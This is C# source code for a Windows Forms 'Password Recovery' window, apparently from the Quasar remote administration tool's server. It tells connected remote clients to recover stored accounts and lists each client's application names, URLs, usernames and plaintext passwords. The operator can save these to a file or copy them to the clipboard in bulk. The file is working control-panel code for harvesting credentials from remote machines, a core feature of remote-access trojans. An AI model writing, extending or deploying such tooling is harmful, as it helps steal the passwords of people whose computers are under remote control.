using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Models;
using Quasar.Server.Networking;

namespace Quasar.Server.Forms
{
    public partial class FrmPasswordRecovery : Form
    {
        /// <summary>
        /// The clients which can be used for the password recovery.
        /// </summary>
        private readonly Client[] _clients;

        /// <summary>
        /// The message handler for handling the communication with the clients.
        /// </summary>
        private readonly PasswordRecoveryHandler _recoveryHandler;

        /// <summary>
        /// Represents a value to display in the ListView when no results were found.
        /// </summary>
        private readonly RecoveredAccount _noResultsFound = new RecoveredAccount()
        {
            Application = "No Results Found",
            Url = "N/A",
            Username = "N/A",
            Password = "N/A"
        };

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmPasswordRecovery"/> class using the given clients.
        /// </summary>
        /// <param name="clients">The clients used for the password recovery form.</param>
        public FrmPasswordRecovery(Client[] clients)
        {
            _clients = clients;
            _recoveryHandler = new PasswordRecoveryHandler(clients);

            RegisterMessageHandler();
            InitializeComponent();
        }

        /// <summary>
        /// Registers the password recovery message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            //_connectClient.ClientState += ClientDisconnected;
            _recoveryHandler.AccountsRecovered += AddPasswords;
            MessageHandler.Register(_recoveryHandler);
        }

        /// <summary>
        /// Unregisters the password recovery message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_recoveryHandler);
            _recoveryHandler.AccountsRecovered -= AddPasswords;
            //_connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        /// TODO: Handle disconnected clients
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void FrmPasswordRecovery_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Password Recovery", _clients.Length);
            txtFormat.Text = Settings.SaveFormat;
            RecoverPasswords();
        }

        private void FrmPasswordRecovery_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.SaveFormat = txtFormat.Text;
            UnregisterMessageHandler();
            _recoveryHandler.Dispose();
        }

        private void RecoverPasswords()
        {
            clearAllToolStripMenuItem_Click(null, null);
            _recoveryHandler.BeginAccountRecovery();
        }

        private void AddPasswords(object sender, string clientIdentifier, List<RecoveredAccount> accounts)
        {
            try
            {
                if (accounts == null || accounts.Count == 0) // no accounts found
                {
                    var lvi = new ListViewItem { Tag = _noResultsFound, Text = clientIdentifier };

                    lvi.SubItems.Add(_noResultsFound.Url); // URL
                    lvi.SubItems.Add(_noResultsFound.Username); // User
                    lvi.SubItems.Add(_noResultsFound.Password); // Pass

                    var lvg = GetGroupFromApplication(_noResultsFound.Application);

                    if (lvg == null) // create new group
                    {
                        lvg = new ListViewGroup
                            { Name = _noResultsFound.Application, Header = _noResultsFound.Application };
                        lstPasswords.Groups.Add(lvg); // add the new group
                    }

                    lvi.Group = lvg;
                    lstPasswords.Items.Add(lvi);
                    return;
                }

                var items = new List<ListViewItem>();
                foreach (var acc in accounts)
                {
                    var lvi = new ListViewItem {Tag = acc, Text = clientIdentifier};

                    lvi.SubItems.Add(acc.Url); // URL
                    lvi.SubItems.Add(acc.Username); // User
                    lvi.SubItems.Add(acc.Password); // Pass

                    var lvg = GetGroupFromApplication(acc.Application);

                    if (lvg == null) // create new group
                    {
                        lvg = new ListViewGroup { Name = acc.Application.Replace(" ", string.Empty), Header = acc.Application };
                        lstPasswords.Groups.Add(lvg); // add the new group
                    }

                    lvi.Group = lvg;
                    items.Add(lvi);
                }

                lstPasswords.Items.AddRange(items.ToArray());
                UpdateRecoveryCount();
            }
            catch
            {
            }
        }

        private void UpdateRecoveryCount()
        {
            groupBox1.Text = $"Recovered Accounts [ {lstPasswords.Items.Count} ]";
        }

        private string ConvertToFormat(string format, RecoveredAccount login)
        {
            return format
                .Replace("APP", login.Application)
                .Replace("URL", login.Url)
                .Replace("USER", login.Username)
                .Replace("PASS", login.Password);
        }

        private StringBuilder GetLoginData(bool selected = false)
        {
            StringBuilder sb = new StringBuilder();
            string format = txtFormat.Text;

            if (selected)
            {
                foreach (ListViewItem lvi in lstPasswords.SelectedItems)
                {
                    sb.Append(ConvertToFormat(format, (RecoveredAccount)lvi.Tag) + "\n");
                }
            }
            else
            {
                foreach (ListViewItem lvi in lstPasswords.Items)
                {
                    sb.Append(ConvertToFormat(format, (RecoveredAccount)lvi.Tag) + "\n");
                }
            }

            return sb;
        }

        #region Group Methods
        private ListViewGroup GetGroupFromApplication(string app)
        {
            ListViewGroup lvg = null;
            foreach (var @group in lstPasswords.Groups.Cast<ListViewGroup>().Where(@group => @group.Header == app))
            {
                lvg = @group;
            }
            return lvg;
        }
        
        #endregion

        #region Menu

        #region Saving

        #region File Saving
        private void saveAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData();
            using (var sfdPasswords = new SaveFileDialog())
            {
                if (sfdPasswords.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(sfdPasswords.FileName, sb.ToString());
                }
            }
        }

        private void saveSelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData(true);
            using (var sfdPasswords = new SaveFileDialog())
            {
                if (sfdPasswords.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(sfdPasswords.FileName, sb.ToString());
                }
            }
        }
        #endregion
        #region Clipboard Copying
        private void copyAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData();

            ClipboardHelper.SetClipboardTextSafe(sb.ToString());
        }

        private void copySelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData(true);

            ClipboardHelper.SetClipboardTextSafe(sb.ToString());
        }
        #endregion

        #endregion

        #region Misc

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RecoverPasswords();
        }

        private void clearAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstPasswords.Items.Clear();
            lstPasswords.Groups.Clear();

            UpdateRecoveryCount();
        }

        private void clearSelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < lstPasswords.SelectedItems.Count; i++)
            {
                lstPasswords.Items.Remove(lstPasswords.SelectedItems[i]);
            }
        }

        #endregion

        #endregion
    }
}
